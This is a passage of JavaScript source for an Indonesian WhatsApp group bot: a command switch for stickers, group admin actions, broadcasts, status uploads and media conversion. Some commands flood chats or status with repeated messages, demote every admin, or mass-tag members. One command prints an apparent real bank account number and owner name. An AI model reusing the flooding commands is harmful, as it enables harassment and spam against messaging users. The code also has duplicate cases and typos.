                    await giie.sendMessage(from, btnasu, MessageType.buttonsMessage, {
                        quoted: fgi
                    })
                }
                break
            case 'autosticker':
                if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                if ((args[0]) === 'on') {
                    if (isAuto) return reply('Fitur autosticker sudah aktif sebelum nya')
                    autosticker.push(from)
                    fs.writeFileSync('./database/autosticker.json', JSON.stringify(autosticker))
                    reply('❬ SUCCSESS ❭ mengaktifkan fitur autosticker di group ini')
                    giie.sendMessage(from, `Perhatian kepada seluruh member fitur autosticker group aktif apabila ada member mengirim gambar dan menggunakan caption apapun, bot akan autosticker gambar kamu.`, text)
                } else if ((args[0]) === 'off') {
                    let aineini = autosticker.indexOf(from)
                    autosticker.splice(aineini, 1)
                    fs.writeFileSync('./database/autosticker.json', JSON.stringify(autosticker))
                    reply('❬ SUCCSESS ❭ menonaktifkan fitur autosticker di group ini ')
                } else if (!c) {
                    anu = `*AUTO STICKER*\n_Please Click Button Dibawah !_\n\n*ON*: untuk mengaktifkan\n*OFF*: untuk menonaktifkan`
                    punten = [{
                        buttonId: 'autosticker on',
                        buttonText: {
                            displayText: 'ON ☺︎︎'
                        },
                        type: 1
                    }, {
                        buttonId: 'autosticker off',
                        buttonText: {
                            displayText: 'OFF ☹︎'
                        },
                        type: 1
                    }]
                    const btnasu = {
                        contentText: `${anu}`,
                        footerText: '*_Developer by: AyogiAk|JavaScript_*',
                        buttons: punten,
                        headerType: 1
                    }
                    await giie.sendMessage(from, btnasu, MessageType.buttonsMessage, {
                        quoted: fgi
                    })
                }
                break
            case 'nsfw':
                if (!isGroup) return reply(mess.only.group)
                if (!isOwner && !isGroupAdmins) return reply(mess.only.admin)
                if ((args[0]) === 'on') {
                    if (isNsfw) return reply('Sudah Aktif Kak')
                    nsfww.push(from)
                    fs.writeFileSync('./database/nsfww.json', JSON.stringify(nsfww))
                    reply('Sukses mengaktifkan fitur nsfw')
                    giie.sendMessage(from, `Bebas Nyari Hentai :v`, text)
                } else if ((args[0]) === 'off') {
                    if (!isNsfw) return reply('Sudah Mati Kak')
                    var ini = nsfww.indexOf(from)
                    nsfww.splice(ini, 1)
                    fs.writeFileSync('./database/nsfww.json', JSON.stringify(nsfww))
                    reply('Sukses menonaktifkan fitur nsfw')
                } else if (!c) {
                    anu = `*NSFW*\n_Please Click Button Dibawah !_\n\n*ON*: untuk mengaktifkan \n*OFF*: untuk menonaktifkan`
                    punten = [{
                        buttonId: 'nsfw on',
                        buttonText: {
                            displayText: 'ON ☺︎︎'
                        },
                        type: 1
                    }, {
                        buttonId: 'nsfw off',
                        buttonText: {
                            displayText: 'OFF ☹︎'
                        },
                        type: 1
                    }]
                    const btnasu = {
                        contentText: `${anu}`,
                        footerText: '*_Developer by: AyogiAk|JavaScript_*',
                        buttons: punten,
                        headerType: 1
                    }
                    await giie.sendMessage(from, btnasu, MessageType.buttonsMessage, {
                        quoted: fgi
                    })
                }
                break
            case 'tinyurl':
                try {
                    link = args[0]
                    anu = await axios.get(`https://tinyurl.com/api-create.php?url=${link}`)
                    reply(`${anu.data}`)
                } catch (e) {
                    emror = String(e)
                    reply(`${e}`)
                }
                break
            case 'rekening':
                nama = "𝗥𝗘𝗞𝗘𝗡𝗜𝗡𝗚 𝗕𝗔𝗡𝗞 𝗕𝗥𝗜";
                impostor = "𝗔𝗬𝗢𝗚𝗜 & 𝗘𝗞𝗔";
                giie.sendMessage(from, {
                    name: nama,
                    address: impostor,
                    jpegThumbnail: ofrply
                }, MessageType.liveLocation, {
                    quoted: floc
                })
                reply('➪ *ɴᴏ ʀᴇᴋ:* 808901004442531\n➪ *ɴᴀᴍᴀ:* ᴀʏᴏɢɪ ᴀᴋʙᴀʀ ᴀғʀᴇɴɢɢᴏ\n➪ *ʙᴀɴᴋ:* ʙʀɪ')
                break
            case 'sharelock':
                kntl = `${args.join(' ')}`
                nama = kntl.split("|")[0];
                impostor = kntl.split("|")[1];
                giie.sendMessage(from, {
                    name: nama,
                    address: impostor,
                    jpegThumbnail: ofrply
                }, MessageType.liveLocation, {
                    quoted: floc
                })
                break
            case 'tts':
                if (args.length < 1) return giie.sendMessage(from, `Kode bahasanya mana kak? contoh : ${prefix}tts id yamate kudasai`, text, {
                    quoted: mek
                })
                const gtts = require('./lib/gtts')(args[0])
                if (args.length < 2) return giie.sendMessage(from, `Teksnya mana kak? contoh : ${prefix}tts id yamate kudasai`, text, {
                    quoted: mek
                })
                var bby = body.slice(8)
                ranm = getRandom('.mp3')
                rano = getRandom('.ogg')
                bby.length > 300 ?
                    reply('Teks nya terlalu panjang kak') :
                    gtts.save(ranm, bby, function() {
                        exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
                            fs.unlinkSync(ranm)
                            buff = fs.readFileSync(rano)
                            if (err) return reply(dla.stikga())
                            giie.sendMessage(from, buff, audio, {
                                duration: 359996400,
                                ptt: true,
                                quoted: mek
                            })
                            fs.unlinkSync(rano)
                        })
                    })
                break
            case 'demote':
                if (!isGroup) return reply(mess.only.group)
                if (!isGroupAdmins) return reply(mess.only.admin)
                if (!isBotGroupAdmins) return reply(mess.only.Badmin)
                if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Reply targetnya!')
                demote = mek.message.extendedTextMessage.contextInfo.participant
                giie.groupDemoteAdmin(from, [demote])
                reply('Sukses demote admin')
                break
            case 'promote':
                if (!isGroup) return reply(mess.only.group)
                if (!isGroupAdmins) return reply(mess.only.admin)
                if (!isBotGroupAdmins) return reply(mess.only.Badmin)
                if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Reply targetnya!')
                promote = mek.message.extendedTextMessage.contextInfo.participant
                giie.groupMakeAdmin(from, [promote])
                reply('Sukses promote member')
                break
            case 'linkgrup':
            case 'linkgroup':
            case 'linkgc':
                if (!isGroup) return reply(mess.only.group)
                if (!isBotGroupAdmins) return reply(mess.only.Badmin)
                linkgc = await giie.groupInviteCode(from)
                yeh = `https://chat.whatsapp.com/${linkgc}\n\nLink grup ${groupName}`
                giie.sendMessage(from, yeh, text, {
                    quoted: mek
                })
                break
            case 'resetlinkgc':
            case 'resetlinkgroup':
            case 'revoke':
                if (!isGroup) return reply(mess.only.group)
                if (!isGroupAdmins) return reply(mess.only.admin)
                if (!isBotGroupAdmins) return reply(mess.only.Badmin)
                json = ['action', 'inviteReset', from]
                giie.query({
                    json,
                    expect200: true
                })
                reply('Sukses Mereset Link Group')
                break
            case 'opengc':
                if (!isGroup) return reply(mess.only.group)
                if (!isGroupAdmins) return reply(mess.only.admin)
                if (!isBotGroupAdmins) return reply(mess.only.Badmin)
                reply(`Sukses membuka grup ${groupName}`)
                giie.groupSettingChange(from, GroupSettingChange.messageSend, false)
                break
            case 'closegc':
                if (!isGroup) return reply(mess.only.group)
                if (!isGroupAdmins) return reply(mess.only.admin)
                if (!isBotGroupAdmins) return reply(mess.only.Badmin)
                reply(`Sukses menutup grup ${groupName}`)
                giie.groupSettingChange(from, GroupSettingChange.messageSend, true)
                break
            case 'spam':
                if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                if (!arg) return reply(`Penggunaan ${prefix}spam teks|jumlah`)
                argzi = arg.split("|")
                if (!argzi) return reply(`Penggunaan ${prefix}spam teks|jumlah`)
                if (Number(argzi[1]) >= 5000) return reply('Kebanyakan!')
                if (isNaN(argzi[1])) return reply(`harus berupa angka`)
                for (let i = 0; i < argzi[1]; i++) {
                    giie.sendMessage(from, argzi[0], MessageType.text)
                }
                break
            case 'demoteall':
                if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                if (!isGroup) return reply(mess.only.group)
                if (!isBotGroupAdmins) return reply(mess.only.Badmin)
                members_id = []
                for (let mem of groupMembers) {
                    members_id.push(mem.jid)
                }
                giie.groupDemoteAdmin(from, members_id)
                break
            case 'promoteall':
                if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                if (!isGroup) return reply(mess.only.group)
                if (!isBotGroupAdmins) return reply(mess.only.Badmin)
                members_id = []
                for (let mem of groupMembers) {
                    members_id.push(mem.jid)
                }
                giie.groupMakeAdmin(from, members_id)
                break
            case 'setnamegc':
                if (!isGroup) return reply(mess.only.group)
                if (!isGroupAdmins) return reply(mess.only.admin)
                if (!isBotGroupAdmins) return reply(mess.only.Badmin)
                giie.groupUpdateSubject(from, `${body.slice(11)}`)
                reply(`Sukses mengganti nama grup ke ${body.slice(11)}`)
                break
            case 'setdeskgc':
            case 'setdescgc':
                if (!isGroup) return reply(mess.only.group)
                if (!isGroupAdmins) return reply(mess.only.admin)
                if (!isBotGroupAdmins) return reply(mess.only.Badmin)
                giie.groupUpdateDescription(from, `${body.slice(10)}`)
                reply(`Sukses mengganti deskripsi grup ke ${body.slice(10)}`)
                break
            case 'setprofile':
            case 'setpp':
                giie.updatePresence(from, Presence.composing)
                if (!isQuotedImage) return reply('Reply imagenya!')
                if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                enmediau = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
                mediau = await giie.downloadAndSaveMediaMessage(enmediau)
                await giie.updateProfilePicture(botNumber, mediau)
                reply('Sukses')
                break
            case 'leave':
                if (!isGroup) return reply(mess.only.group)
                if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                giie.updatePresence(from, Presence.composing)
                giie.groupLeave(from)
                break
            case 'bc':
                giie.updatePresence(from, Presence.composing)
                if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                if (args.length < 1) return reply('Teksnya?')
                anu = await giie.chats.all()
                if (isMedia && !mek.message.videoMessage || isQuotedImage) {
                    const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                    buff = await giie.downloadMediaMessage(encmedia)
                    for (let _ of anu) {
                        giie.sendMessage(_.jid, buff, image, {
                            viewOnce: true,
                            caption: `${body.slice(4)}`
                        })
                    }
                    reply(`Sukses mengirim Broadcast ${body.slice(4)}`)
                } else if (isMedia && !mek.message.videoMessage || isQuotedVideo) {
                    const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                    buff = await giie.downloadMediaMessage(encmedia)
                    for (let _ of anu) {
                        giie.sendMessage(_.jid, buff, video, {
                            viewOnce: true,
                            caption: `${body.slice(4)}`
                        })
                    }
                    reply(`Sukses mengirim Broadcast ${body.slice(4)}`)
                } else if (isMedia && !mek.message.videoMessage || isQuotedVideo) {
                    const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                    buff = await giie.downloadMediaMessage(encmedia)
                    for (let _ of anu) {
                        giie.sendMessage(_.jid, buff, video, {
                            mimetype: Mimetype.gif,
                            quoted: finv,
                            contextInfo: {
                                forwardingScore: 508,
                                isForwarded: true
                            },
                            caption: `${body.slice(4)}`
                        })
                    }
                    reply(`Sukses mengirim Broadcast ${body.slice(4)}`)
                } else {
                    for (let _ of anu) {
                        sendMess(_.jid, `${body.slice(4)}`)
                    }
                    reply(`Sukses mengirim Broadcast:\n${body.slice(4)}`)
                }
                break
            case 'spamsw':
                if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                if (!arg) return reply(`Penggunaan ${prefix}spamsw teks|jumlah`)
                argzi = arg.split("|")
                if (!argzi) return reply(`Penggunaan ${prefix}spam teks|jumlah`)
                if (Number(argzi[1]) >= 50) return reply('Kebanyakan!')
                if (isNaN(argzi[1])) return reply(`harus berupa angka`)
                for (let i = 0; i < argzi[1]; i++) {
                    giie.sendMessage('status@broadcast', argzi[0], MessageType.text)
                }
                break
            case 'upswteks':
                if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                if (args.length < 1) return reply('Teksnya?')
                teks = body.slice(10)
                giie.sendMessage('status@broadcast', teks, MessageType.text)
                reply(`Sukses upload status:\n${teks}`)
                break
            case 'upswlokasi':
                if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                if (args.length < 1) return reply('Teksnya?')
                teks = body.slice(12)
                giie.sendMessage('status@broadcast', {
                    degreesLatitude: 24.121231,
                    degreesLongitude: 55.1121221,
                    name: teks,
                    address: `${NamaBot}`
                }, MessageType.location)
                reply(`Sukses upload lokasi:\n${teks}`)
                break
            case 'upswsticker':
                if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                if (!isQuotedSticker) return reply('Reply stikernya!')
                if (isMedia && !mek.message.videoMessage || isQuotedSticker) {
                    const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                    buff = await giie.downloadMediaMessage(encmedia)
                    giie.sendMessage('status@broadcast', buff, sticker)
                }
                reply(`Sukses upload sticker`)
                break
            case 'upswaudio':
                if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                if (!isQuotedAudio) return reply('Reply audionya!')
                if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
                    const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                    buff = await giie.downloadMediaMessage(encmedia)
                    giie.sendMessage('status@broadcast', buff, audio, {
                        mimetype: 'audio/mp4',
                        duration: 359996400
                    })
                }
                reply(`Sukses upload audio`)
                break
            case 'upswvoice':
                if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                if (!isQuotedAudio) return reply('Reply audionya!')
                if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
                    const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                    buff = await giie.downloadMediaMessage(encmedia)
                    giie.sendMessage('status@broadcast', buff, audio, {
                        mimetype: 'audio/mp4',
                        duration: 359996400,
                        ptt: true
                    })
                }
                reply(`Sukses upload voice`)
                break
            case 'upswvideo':
                if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                var konti = body.slice(11)
                reply(mess.wait)
                var enmediap = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
                var mediap = await giie.downloadAndSaveMediaMessage(enmediap)
                const buffer3 = fs.readFileSync(mediap)
                giie.sendMessage('status@broadcast', buffer3, MessageType.video, {
                    duration: 359996400,
                    caption: `${konti}`
                })
                reply(`Sukses upload video:\n${konti}`)
                break
            case 'upswgif':
                if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                var konti = body.slice(7)
                reply(mess.wait)
                enmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
                media = await giie.downloadAndSaveMediaMessage(enmedia)
                const buffer6 = fs.readFileSync(media)
                giie.sendMessage('status@broadcast', buffer6, MessageType.video, {
                    mimetype: 'video/gif',
                    caption: `${konti}`
                })
                reply(`Sukses upload gif:\n${konti}`)
                break
            case 'upswimage':
                if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                var teksyy = body.slice(11)
                reply(mess.wait)
                enmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
                media = await giie.downloadAndSaveMediaMessage(enmedia)
                buffer = fs.readFileSync(media)
                giie.sendMessage('status@broadcast', buffer, MessageType.image, {
                    quoted: mek,
                    caption: `${teksyy}`
                })
                reply(`Sukses upload image:\n${teksyy}`)
                break
            case 'shutdown':
                if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                return giie.sendMessage(from, JSON.stringify(eval(process.exit())))
                reply('Okey')
                break
            case 'tomp4':
                if (!isQuotedSticker) return reply('Reply stiker nya')
                reply(mess.wait)
                if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
                    ger = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                    owgi = await giie.downloadAndSaveMediaMessage(ger)
                    webp2mp4File(owgi).then(res => {
                        sendMediaURL(from, res.result)
                    })
                } else {
                    reply('Reply Stickernya!')
                }
                fs.unlinkSync(owgi)
                break
            case 'tovn':
            case 'getvn':
                if (!isQuotedAudio && !isQuotedVideo) return reply('Tag audio/vn/video nya!')
                reply(mess.wait)
                encmedias = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
                medias = await giie.downloadAndSaveMediaMessage(encmedias)
                ran = getRandom('.mp4')
                exec(`ffmpeg -i ${medias} ${ran}`, (err) => {
                    fs.unlinkSync(medias)
                    if (err) return reply(mess.error.api)
                    mhee = fs.readFileSync(ran)
                    giie.sendMessage(from, mhee, audio, {
                        mimetype: 'audio/mp4',
                        duration: 359996400,
                        ptt: true,
                        quoted: mek
                    })
                    fs.unlinkSync(ran)
                })
                break
            case 'tomp3':
                giie.updatePresence(from, Presence.composing)
                if (!isQuotedVideo) return reply('Reply Video Nya Kak')
                reply(mess.wait)
                encmediad = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
                mediad = await giie.downloadAndSaveMediaMessage(encmediad)
                ran = getRandom('.mp4')
                exec(`ffmpeg -i ${mediad} ${ran}`, (err) => {
                    fs.unlinkSync(mediad)
                    if (err) return reply(mess.error.api)
                    mhee = fs.readFileSync(ran)
                    giie.sendMessage(from, mhee, audio, {
                        mimetype: 'audio/mp4',
                        duration: 359996400,
                        quoted: mek
                    })
                    fs.unlinkSync(ran)
                })
                break
            case 'suit':
                if (args.length < 1) return reply('Pilih gunting/batu/kertas')
                if (args[0] === 'gunting') {
                    gunting = [
                        "Kamu *Gunting*\nAku *Kertas*\nKamu Menang 😔",
                        "Kamu *Gunting*\nAku *Batu*\nKamu Kalah 🙂",
                        "Kamu *Gunting*\nAku *Gunting*\nKita Seri 😏"
                    ]
                    gun = gunting[Math.floor(Math.random() * gunting.length)]
                    reply(gun)
                } else if (args[0] === 'kertas') {
                    ker = [
                        "Kamu *Kertas*\nAku *Batu*\nKamu Menang 😔",
                        "Kamu *Kertas*\nAku *Gunting*\nKamu Kalah 🙂",
                        "Kamu *Kertas*\nAku *Kertas*\nKita Seri 😏"
                    ]
                    kertas = ker[Math.floor(Math.random() * ker.length)]
                    reply(kertas)
                } else if (args[0] === 'batu') {
                    bat = [
                        "Kamu *Batu*\nAku *Gunting*\nKamu Menang ??",
                        "Kamu *Batu*\nAku *Kertas*\nKamu Kalah 🙂",
                        "Kamu *Batu*\nAku *Batu*\nKita Seri 😏"
                    ]
                    batu = bat[Math.floor(Math.random() * bat.length)]
                    reply(batu)
                } else {
                    reply('Pilih gunting/batu/kertas')
                }
                break
            case 'slot':
            case 'slots':
                const somtoy = sotoy[Math.floor(Math.random() * sotoy.length)]
                punten = [{
                    buttonId: 'slot',
                    buttonText: {
                        displayText: 'SPIN'
                    },
                    type: 1
                }, {
                    buttonId: 'slotinfo',
                    buttonText: {
                        displayText: 'KETERANGAN'
                    },
                    type: 1
                }]
                const slott = {
                    contentText: `${somtoy}`,
                    footerText: '*_Developer by: AyogiAk|JavaScript_*',
                    buttons: punten,
                    headerType: 1
                }
                await giie.sendMessage(from, slott, MessageType.buttonsMessage, {
                    quoted: fgi
                })
                break
            case 'slotinfo':
                nasi = `Keterangan : Jika anda Mendapatkan 3 Gambar Yang Sama Berarti Anda Menang\n\nContoh : 🎃 : 🎃 : 🎃☜︎︎︎`
                grupinv(nasi)
                break
            case 'kontak':
                if (!isGroup) return reply(mess.only.group)
                argzu = arg.split('|')
                if (!argzu) return reply(`Penggunaan ${prefix}kontak @tag|nama`)
                if (mek.message.extendedTextMessage != undefined) {
                    mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
                    sendKontak(from, mentioned[0].split('@')[0], argzu[1])
                } else {
                    sendKontak(from, argzu[0], argzu[1])
                }
                break
                case 'tohidetag':
            case 'remotehidetagtext':
                if (!mek.key.fromMe && !isOwner) return reply(mess.only.owner)
                if (!isGroup) return reply(mess.only.group)
                var value = args.join(' ')
                var tex1 = value.split('|')[0]
                var tex2 = value.split('|')[1]
                var group = await giie.groupMetadata(`${tex1}`)
                var member = group['participants']
                var mem = []
                member.map(async adm => {
                    mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
                })
                var optionshidetag = {
                    text: tex2,
                    contextInfo: {
                        mentionedJid: mem
                    },
                    quoted: mek
                }
                giie.sendMessage(`${tex1}`, optionshidetag, text)
                break
            case 'kontag':
                if (!isGroup) return reply(mess.only.group)
                argzi = arg.split('|')
                if (!argzi) return reply(`Penggunaan ${prefix}kontak @tag|nama`)
                if (mek.message.extendedTextMessage != undefined) {
                    mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
                    hideTagKontak(from, mentioned[0].split('@')[0], argzi[1])
                } else {
                    hideTagKontak(from, argzi[0], argzi[1])
                }
                break
            case 'getdeskgc':
                if (!isGroup) return reply(mess.only.group)
                anu = from
                metadete = await giie.groupMetadata(anu)
                giie.sendMessage(from, metadete.desc, text, {
                    quoted: mek
                })
                break
            case 'getbio':
                var yy = mek.message.extendedTextMessage.contextInfo.participant
                var p = await giie.getStatus(`${yy}`, MessageType.text)
                reply(p.status)
                if (p.status == 401) {
                    reply(mess.error.api)
                }
                break
            case 'getname':
                var ambl = mek.message.extendedTextMessage.contextInfo.participant
                const sname = giie.contacts[ambl] != undefined ? giie.contacts[ambl].notify = undefined ? PhoneNumber('+' + ambl.replace('@s.whatsapp.net', '')).getNumber('international') : giie.contacts[ambl].notify || giie.contacts[ambl].vname : PhoneNumber('+' + ambl.replace('@s.whatsapp.net', '')).getNumber('international')
                grupinv(sname)
                break
            case 'getpict':
            case 'getpic':
                if (!isGroup) return reply(mess.only.group)
                mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
                pictt = await giie.getProfilePicture(mentioned)
                pict = await getBuffer(pictt)
                giie.sendMessage(from, pict, image, {
                    quoted: mek
                })
                break
            case 'chat':
                if (args[0].startsWith('08')) return reply('Awali nomor dengan 62')
                if (args[0].startsWith('+62')) return reply('Awali nomor dengan 62')
                if (args.length < 1) return reply(`Penggunaan ${prefix}chat 62xnxx|teks`)
                var pc = body.slice(6)
                var nomor = pc.split("|")[0];
                var org = pc.split("|")[1];
                giie.sendMessage(nomor + '@s.whatsapp.net', org, MessageType.text)
                reply(`Sukses mengirim chat:\n${org},@${nomor}`)
                break
            case 'linkwa':
                if (args[0].startsWith('08')) return reply('Awali nomor dengan 62')
                if (args[0].startsWith('+62')) return reply('Awali nomor dengan 62')
                if (args.length < 1) return reply(`Penggunaan ${prefix}linkwa 62xnxx|teks`)
                var pc = body.slice(6)
                var nomor = body.slice(8)
                linkk = `https://wa.me/${nomor}`
                anu = await axios.get(`https://tinyurl.com/api-create.php?url=${linkk}`)
                reply(`${anu.data}`)
                break

            case 'ttp':
                if (!c) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}ttp ${NamaBot}`)
                anu1 = await getBuffer(`https://viko-api.herokuapp.com/api/maker/ttp?apikey=${VikoApi}&text=${c}`)
                sendStickerUrl(from, anu1)
                break
            case 'attp':
                if (!c) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}attp ${NamaBot}`)
                atetepe = await getBuffer(`https://api.xteam.xyz/attp?file&text=${encodeURIComponent(c)}`)
                giie.sendMessage(from, atetepe, sticker)
                break
            case 'semoji':
                if (args === 0) return reply('emojinya?')
                aku4 = args.join(' ')
                emoji.get(`${aku4}`).then(emoji => {
                    link = `${emoji.images[10].url}`
                    sendWebp(from, `${link}`).catch(() => reply('gagal'))
                })
                break
            case 'tag':
                if (args.length < 1) return reply(`Penggunaan ${prefix}tag 62xnxx`)
                var nomqm = `${body.slice(5)}@s.whatsapp.net`
                tagq = `@${nomqm.split('@')[0]}`
                giie.sendMessage(from, tagq, text, {
                    quoted: fvid,
                    contextInfo: {
                        forwardingScore: 508,
                        isForwarded: true,
                        mentionedJid: [nomqm]
                    }
                })
                break
            case 'tagme':
                var nomqm = mek.participant
                tagu = `@${nomqm.split('@s.whatsapp.net')[0]}`
                giie.sendMessage(from, tagu, text, {
                    quoted: fvid,
                    contextInfo: {
                        forwardingScore: 508,
                        isForwarded: true,
                        mentionedJid: [nomqm]
                    }
                })
                break
            case 'join':
                if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                if (args.length < 1) return ephe('Link nya mana?')
                giie.query({
                    json: ["action", "invite", `${args[0].replace('https://chat.whatsapp.com/','')}`]
                })
                grupinv('Sukses bergabung dalam group')
                break
            case 'tohidetag':
                if (!isGroup) return reply(mess.only.group)
                if (isMedia && !mek.message.videoMessage || isQuotedSticker) {
                    encmediau = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                    file = await giie.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
                    value = args.join(" ")
                    const nomqm = value.split('|')[0]
                    var group = await giie.groupMetadata(`${nomqm}`)
                    var member = group['participants']
                    var mem = []
                    member.map(async adm => {
                        mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
                    })
                    var options = {
                        contextInfo: {
                            mentionedJid: mem
                        },

                    }
                    ini_buffer = fs.readFileSync(file)
                    giie.sendMessage(`${nomqm}`, ini_buffer, sticker, options)
                    fs.unlinkSync(file)
                } else if (isMedia && !mek.message.videoMessage || isQuotedImage) {
                    encmediau = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                    file = await giie.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
                    value = args.join(" ")
                    const nomqm = value.split('|')[0]
                    var group = await giie.groupMetadata(`${nomqm}`)
                    var member = group['participants']
                    var mem = []
                    member.map(async adm => {
                        mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
                    })
                    var options = {
                        contextInfo: {
                            mentionedJid: mem
                        },

                    }
                    ini_buffer = fs.readFileSync(file)
                    giie.sendMessage(`${nomqm}`, ini_buffer, image, options)
                    fs.unlinkSync(file)
                } else if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
                    encmediau = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                    file = await giie.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
                    value = args.join(" ")
                    const nomqm = value.split('|')[0]
                    var group = await giie.groupMetadata(`${nomqm}`)
                    var member = group['participants']
                    var mem = []
                    member.map(async adm => {
                        mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
                    })
                    var options = {
                        mimetype: 'audio/mp4',
                        duration: 359996400,
                        ptt: true,
                        contextInfo: {
                            mentionedJid: mem
                        },

                    }
                    ini_buffer = fs.readFileSync(file)
                    giie.sendMessage(`${nomqm}`, ini_buffer, audio, options)
                    fs.unlinkSync(file)
                } else if (isMedia && !mek.message.videoMessage || isQuotedVideo) {
                    encmediau = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                    file = await giie.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
                    value = args.join(" ")
                    const nomqm = value.split('|')[0]
                    var group = await giie.groupMetadata(`${nomqm}`)
                    var member = group['participants']
                    var mem = []
                    member.map(async adm => {
                        mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
                    })
                    var options = {
                        mimetype: 'video/gif',
                        contextInfo: {
                            mentionedJid: mem
                        },

                    }
                    ini_buffer = fs.readFileSync(file)
                    giie.sendMessage(`${nomqm}`, ini_buffer, video, options)
                    fs.unlinkSync(file)
                } else if (isMedia && !mek.message.videoMessage || isQuotedVideo) {
                    encmediau = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                    file = await giie.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
                    value = args.join(" ")
                    const nomqm = valur.split('|')[0]
                    var group = await giie.groupMetadata(`${nomqm}`)
                    var member = group['participants']
                    var mem = []
                    member.map(async adm => {
                        mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
                    })
                    var options = {
                        mimetype: 'video/mp4',
                        duration: 359996400,
                        contextInfo: {
                            mentionedJid: mem
                        },

                    }
                    ini_buffer = fs.readFileSync(file)
                    giie.sendMessage(`${nomqm}`, ini_buffer, video, options)
                    fs.unlinkSync(file)
                } else {
                    reply(`reply gambar/dokumen/gif/sticker/audio/video dengan caption ${prefix}totag idgroup`)
                }
                break
            case 'totag':
                if (!isGroup) return reply(mess.only.group)
                if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
                    encmediau = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                    file = await giie.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
                    value = args.join(" ")
                    var group = await giie.groupMetadata(from)
                    var member = group['participants']
                    var mem = []
                    member.map(async adm => {
                        mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
                    })
                    var options = {
                        contextInfo: {
                            mentionedJid: mem
                        },

                    }
                    ini_buffer = fs.readFileSync(file)
                    giie.sendMessage(from, ini_buffer, sticker, options)
                    fs.unlinkSync(file)
                } else if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
                    encmediau = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                    file = await giie.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
                    value = args.join(" ")
